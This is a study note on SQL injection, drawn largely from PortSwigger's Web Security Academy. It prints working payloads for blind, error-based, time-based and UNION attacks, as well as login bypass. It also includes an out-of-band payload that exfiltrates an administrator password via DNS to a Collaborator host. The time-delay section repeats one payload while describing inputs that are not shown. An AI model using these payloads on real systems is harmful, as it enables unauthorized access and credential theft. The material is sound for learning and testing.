
### TL;DR

- SQL Injection cheat sheet
	- [https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)


![](/static/img/Pasted_image_20230529091416.png)

### What is SQL Injection

- Web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database.
- In some situations, an attacker can escalate a SQL injection attack to compromise the underlying server or other back-end infrastructure, or perform a denial-of-service attack.
### Impact of successful SQL Injection attack
- A successful SQL injection attack can result in unauthorized access to sensitive data.
- Reputational damage and regulatory fines.
- Leading to a long-term compromise that can go unnoticed for an extended period.

---

### How to detect SQL Injection vulnerabilities

- SQL injection can be detected manually by using a systematic set of tests against every entry point in the application. This typically involves
	- Submitting the single quote character `'` and looking for errors or other anomalies.
	- Submitting some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and looking for systematic differences in the resulting application responses.
	- Submitting Boolean conditions such as `OR 1=1` and `OR 1=2`, and looking for differences in the application's responses.
	- Submitting payloads designed to trigger time delays when executed within a SQL query, and looking for differences in the time taken to respond.
	- Submitting OAST payloads designed to trigger an out-of-band network interaction when executed within a SQL query, and monitoring for any resulting interactions.

--- 

### Blind SQL Injection vulnerabilities

- Blind SQL injection arises when an application is vulnerable to SQL injection, **but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors**.
- With blind SQL injection vulnerabilities, many techniques such as [`UNION` attacks](https://portswigger.net/web-security/sql-injection/union-attacks), **are not effective because they rely on being able to see the results of the injected query within the application's responses.**
- **Many instances of SQL injection are blind vulnerabilities** ( This means that the application does not return the results of the SQL query or the details of any database errors within its responses )
- Blind vulnerabilities can still be exploited to access unauthorized data, but the techniques involved are generally more complicated and difficult to perform.
- How to exploit blind vulnerabilities
	- You can change the logic of the query to trigger a detectable difference in the application's response depending on the truth of a single condition. This might involve injecting a new condition into some Boolean logic, or **conditionally triggering an error such as a divide-by-zero**.
	- You can conditionally trigger a time delay in the processing of the query, allowing you to infer the truth of the condition based on the time that the application takes to respond.
	- You can trigger an out-of-band network interaction, using [OAST](https://portswigger.net/burp/application-security-testing/oast) techniques. This technique is extremely powerful and works in situations where the other techniques do not. Often, you can directly exfiltrate data via the out-of-band channel, for example by placing the data into a DNS lookup for a domain that you control.
- Exploiting blind SQL Injection by triggering conditional responses
	- `…xyz' AND '1'='1 …xyz' AND '1'='2`
	- The first of these values will cause the query to return results, because the injected `AND '1'='1` condition is true. Whereas the second value will cause the query to not return any results, because the injected condition is false. This allows us to determine the answer to any single injected condition, and so extract data one bit at a time.
	- For example, suppose there is a table called `Users` with the columns `Username` and `Password`, and a user called `Administrator`. We can systematically determine the password for this user by sending a series of inputs to test the password one character at a time. To do this, we start with the following input:
	- ``xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm``
	- This returns the "Welcome back" message, indicating that the injected condition is true, and so the first character of the password is greater than `m`.
	- Next, we send the following input: ``xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't` 
	- This does not return the "Welcome back" message, indicating that the injected condition is false, and so the first character of the password is not greater than `t`.
	- We can continue this process to systematically determine the full password for the `Administrator` user.
	- **The `SUBSTRING` function is called `SUBSTR` on some types of database.**

--- 

### Error-based SQL injection

- Error-based SQL injection refers to cases where you're able to use **error messages** to either extract or infer sensitive data from the database.
- You may be able to induce the application to return a specific error response based on the result of a boolean expression.
	- You can exploit this in the same way as the [conditional responses](https://portswigger.net/web-security/sql-injection/blind#exploiting-blind-sql-injection-by-triggering-conditional-responses) we looked at in the previous section.
	- You may be able to trigger error messages that output the data returned by the query. This effectively turns otherwise blind SQL injection vulnerabilities into "visible" ones. For more information, see [Extracting sensitive data via verbose SQL error messages](https://portswigger.net/web-security/sql-injection/blind#extracting-sensitive-data-via-verbose-sql-error-messages).
-  Exploiting blind SQL injection by triggering conditional errors
	-  it is often possible to induce the application to return conditional responses by triggering SQL errors conditionally, depending on an injected condition.
	- This involves modifying the query so that it will cause a database error if the condition is true, but not if the condition is false. Very often, an unhandled error thrown by the database will cause some difference in the application's response (such as an error message), allowing us to infer the truth of the injected condition.
	- To see how this works, suppose that two requests are sent containing the following `TrackingId` cookie values in turn:
```sql
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a 
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```
- These inputs use the `CASE` keyword to test a condition and return a different expression depending on whether the expression is true.
- With the first input, the `CASE` expression evaluates to `'a'`, which does not cause any error. With the second input, it evaluates to `1/0`, which causes a divide-by-zero error. Assuming the error causes some difference in the application's HTTP response, we can use this difference to infer whether the injected condition is true.
- Using this technique, we can retrieve data in the way already described, by systematically testing one character at a time:

```sql
`xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`
```

--- 
### Extracting sensitive data via verbose SQL error messages

- Misconfiguration of the database sometimes results in verbose error messages.
- Example, consider the following error message, which occurs after injecting a single quote into an `id` parameter: ``Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char``
- Occasionally, you may be able to induce the application to generate an error message that contains some of the data that is returned by the query. This effectively turns an otherwise blind SQL injection vulnerability into a "visible" one.
- One way of achieving this is to use the `CAST()` function, which enables you to convert one data type to another. For example, consider a query containing the following statement:
```sql
CAST((SELECT example_column FROM example_table) AS int)
```
- Often, the data that you're trying to read is a string. Attempting to convert this to an incompatible data type, such as an `int`, may cause an error similar to the following:
```
ERROR: invalid input syntax for type integer: "Example data"
```

---

## Exploiting blind SQL injection by triggering time delays

- In some of the preceding examples, we've seen how you can exploit the way applications fail to properly handle database errors. **But what if the application catches these errors and handles them gracefully**? Triggering a database error when the injected SQL query is executed no longer causes any difference in the application's response, so the preceding technique of inducing conditional errors will not work.
- it is often possible to exploit the **blind SQL injection vulnerability by triggering time delays conditionally**, depending on an injected condition. **Because SQL queries are generally processed synchronously** by the application, delaying the execution of a SQL query will also delay the HTTP response.
- This allows us to infer the truth of the injected condition based on the time taken before the HTTP response is received.
- **The techniques for triggering a time delay are highly specific to the type of database being used**
- The techniques for triggering a time delay are highly specific to the type of database being used. On Microsoft SQL Server, input like the following can be used to test a condition and trigger a delay depending on whether the expression is true:
```sql
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
```

- The first of these inputs will not trigger a delay, because the condition `1=2` is false. The second input will trigger a delay of 10 seconds, because the condition `1=1` is true.
- Using this technique, we can retrieve data in the way already described, by systematically testing one character at a time:
```sql
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
```

---
### Exploiting blind SQL injection using out-of-band ([OAST](https://portswigger.net/burp/application-security-testing/oast)) techniques
- The query is still vulnerable to SQL injection, however none of the techniques described so far will work: the application's response doesn't depend on whether the query returns any data, or on whether a database error occurs, or on the time taken to execute the query
- In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering out-of-band network interactions to a system that you control
- A variety of network protocols can be used for this purpose, but typically the most effective is DNS (domain name service). This is because very many production networks allow free egress of DNS queries, because they are essential for the normal operation of production systems.
- The techniques for triggering a DNS query are highly specific to the type of database being used. On Microsoft SQL Server, input like the following can be used to cause a DNS lookup on a specified domain: ``'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--`` 
- Having confirmed a way to trigger out-of-band interactions, you can then use the out-of-band channel to exfiltrate data from the vulnerable application. For example: ``'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--``
- This input reads the password for the `Administrator` user, appends a unique Collaborator subdomain, and triggers a DNS lookup. This will result in a DNS lookup. Out-of-band (OAST) techniques are an extremely powerful way to detect and exploit blind SQL injection, due to the highly likelihood of success and the ability to directly exfiltrate data within the out-of-band channel. For this reason, OAST techniques are often preferable even in situations where other techniques for blind exploitation do work.
--- 
###  Examining the database in SQL injection attacks

- Different databases provide different ways of querying their version.
- The queries to determine the database version for some popular database types are as follows:

|   |   |
|---|---|
|Database type|Query|
|Microsoft, MySQL|`SELECT @@version`|
|Oracle|`SELECT * FROM v$version`|
|PostgreSQL|`SELECT version()`|

- For example, you could use a `UNION` attack with the following input:
	- `' UNION SELECT @@version--`

##### Listing the contents of the database
- Most database types (with the notable exception of Oracle) have a set of views called the **information schema** which provide **information about the database**.
- You can query `information_schema.tables` to list the tables in the database: ``SELECT * FROM information_schema.tables``
- You can then query `information_schema.columns` to list the columns in individual tables, example: ``SELECT * FROM information_schema.columns WHERE table_name = 'Users'``
> Oracle databases, You can list tables by querying `all_tables`. `SELECT * FROM all_tables` and to retrieve the list of columns you can use `all_tab_columns` , example: `SELECT * FROM all_tab_columns WHERE table_name = 'USERS'`

----
### Union SQL Injection

- `UNION` keyword can be used to retrieve data **from other tables** within the database
- The `UNION` keyword lets you execute one or more additional `SELECT` queries and append the results to the original query -> `SELECT a, b FROM table1 UNION SELECT c, d FROM table2`

> For a `UNION` query to work, two key requirements **must be met**:
> 1 - The individual queries must return the same **number of columns**
> 2 - The data types in each column must be compatible between the individual queries

- You need to ask
	-  **How many columns** are being returned from the original query?
	- Which columns returned from the original query are of a suitable data type to hold the results from the injected query?

##### Determining the number of columns required in a SQL injection UNION attack

- there are **two effective methods** to determine how many columns are being returned from the original query.
	-  injecting a series of `ORDER BY` clauses and incrementing the specified column index until an error occurs  -> `order by 1-- `
	- The second method involves submitting a series of `UNION SELECT` payloads specifying a different number of null values: -> `union select null--`

> The application might actually return this error message, or might just return a generic error or no results. When the number of nulls matches the number of columns, the database returns an additional row in the result set, containing null values in each column. The effect on the resulting HTTP response depends on the application's code. If you are lucky, you will see some additional content within the response, such as an extra row on an HTML table. Otherwise, the null values might trigger a different error, such as a `NullPointerException`. Worst case, the response might be indistinguishable from that which is caused by an incorrect number of nulls, making this method of determining the column count ineffective.

> NOTE: The reason for using `NULL` as the values returned from the injected `SELECT` query is that the data types in each column must be compatible between the original and the injected queries. Since `NULL` is convertible to every commonly used data type, using `NULL` maximizes the chance that the payload will succeed when the column count is correct.
> Oracle Database -> On Oracle, every `SELECT` query must use the `FROM` keyword and specify a valid table. There is a built-in table on Oracle called `dual` which can be used for this purpose. So the injected queries on Oracle would need to look like `UNION SELECT NULL FROM DUAL--`  . 

##### Finding columns with a useful data type in a SQL injection UNION attack

- The reason for performing a SQL injection UNION attack is to be able to retrieve the results from an injected query. Generally, the interesting data that you want to retrieve will be in string form, so you need to find one or more columns in the original query results whose data type is, or is compatible with, string data, but you need first:
	- Determined the number of required columns
	- You can probe each column to test whether it can hold string data by submitting a series of `UNION SELECT` payloads that place a string value into each column in turn, example: 

```sql

' UNION SELECT 'a',NULL,NULL,NULL-- 
' UNION SELECT NULL,'a',NULL,NULL-- 
' UNION SELECT NULL,NULL,'a',NULL-- 
' UNION SELECT NULL,NULL,NULL,'a'--

```

- If the data type of a column is not compatible with string data, the injected query will cause a database error.
- If an error does not occur, and the application's response contains some additional content including the injected string value, then the relevant column is suitable for retrieving string data.

##### Using a SQL injection UNION attack to retrieve interesting data 

- When you have determined the number of columns returned by the original query and found which columns can hold string data, you are in a position to retrieve interesting data
- Suppose that:
	- The original query returns two columns, both of which can hold string data.
	- The injection point is a quoted string within the `WHERE` clause.
	- The database contains a table called `users` with the columns `username` and `password`.

In this situation, you can retrieve the contents of the `users` table by submitting the input:

`' UNION SELECT username, password FROM users--`

Of course, the crucial information needed to perform this attack is that there is a table called `users` with two columns called `username` and `password`. Without this information, you would be left trying to guess the names of tables and columns. In fact, all modern databases provide ways of examining the database structure, to determine what tables and columns it contains.


##### Retrieving multiple values within a single column

In the preceding example, suppose instead that the query only returns a single column.
You can easily retrieve multiple values together within this single column by concatenating the values together, ideally including a suitable separator to let you distinguish the combined values. For example, on Oracle you could submit the input:

`' UNION SELECT username || '~' || password FROM users--`

This uses the double-pipe sequence `||` which is a string concatenation operator on Oracle. The injected query concatenates together the values of the `username` and `password` fields, separated by the `~` character.

The results from the query will let you read all of the usernames and passwords, for example:

`... administrator~s3cure wiener~peter carlos~montoya ...`

Note that different databases use different syntax to perform string concatenation. For more details, see the [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).

----

### Retrieving hidden data


Consider a shopping application that displays products in different categories. When the user clicks on the Gifts category, their browser requests the URL:

`https://insecure-website.com/products?category=Gifts`

This causes the application to make a SQL query to retrieve details of the relevant products from the database:

`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

This SQL query asks the database to return:

- all details (*)
- from the products table
- where the category is Gifts
- and released is 1.

The restriction `released = 1` is being used to hide products that are not released. For unreleased products, presumably `released = 0`.

The application doesn't implement any defenses against SQL injection attacks, so an attacker can construct an attack like:

`https://insecure-website.com/products?category=Gifts'--`

This results in the SQL query:

`SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1`

The key thing here is that the double-dash sequence `--` is a comment indicator in SQL, and means that the rest of the query is interpreted as a comment. This effectively removes the remainder of the query, so it no longer includes `AND released = 1`. This means that all products are displayed, including unreleased products.

Going further, an attacker can cause the application to display all the products in any category, including categories that they don't know about:

`https://insecure-website.com/products?category=Gifts'+OR+1=1--`

This results in the SQL query:

`SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1`

The modified query will return all items where either the category is Gifts, or 1 is equal to 1. Since `1=1` is always true, the query will return all items.


> Take care when injecting the condition `OR 1=1` into a SQL query. Although this may be harmless in the initial context you're injecting into, it's common for applications to use data from a single request in multiple different queries. If your condition reaches an `UPDATE` or `DELETE` statement, for example, this can result in an accidental loss of data.

#### Subverting application logic

Consider an application that lets users log in with a username and password. If a user submits the username `wiener` and the password `bluecheese`, the application checks the credentials by performing the following SQL query:

`SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'`

If the query returns the details of a user, then the login is successful. Otherwise, it is rejected.

Here, an attacker can log in as any user without a password simply by using the SQL comment sequence `--` to remove the password check from the `WHERE` clause of the query. For example, submitting the username `administrator'--` and a blank password results in the following query:

`SELECT * FROM users WHERE username = 'administrator'--' AND password = ''`

This query returns the user whose username is `administrator` and successfully logs the attacker in as that user



---

### SQL Injection Examples

- [Retrieving hidden data](https://portswigger.net/web-security/sql-injection#retrieving-hidden-data), where you can modify a SQL query to return additional results.
-  [Subverting application logic](https://portswigger.net/web-security/sql-injection#subverting-application-logic), where you can change a query to interfere with the application's logic.
-  [UNION attacks](https://portswigger.net/web-security/sql-injection/union-attacks), where you can retrieve data from different database tables.
- [Examining the database](https://portswigger.net/web-security/sql-injection/examining-the-database), where you can extract information about the version and structure of the database.
-  [Blind SQL injection](https://portswigger.net/web-security/sql-injection/blind), where the results of a query you control are not returned in the application's responses.
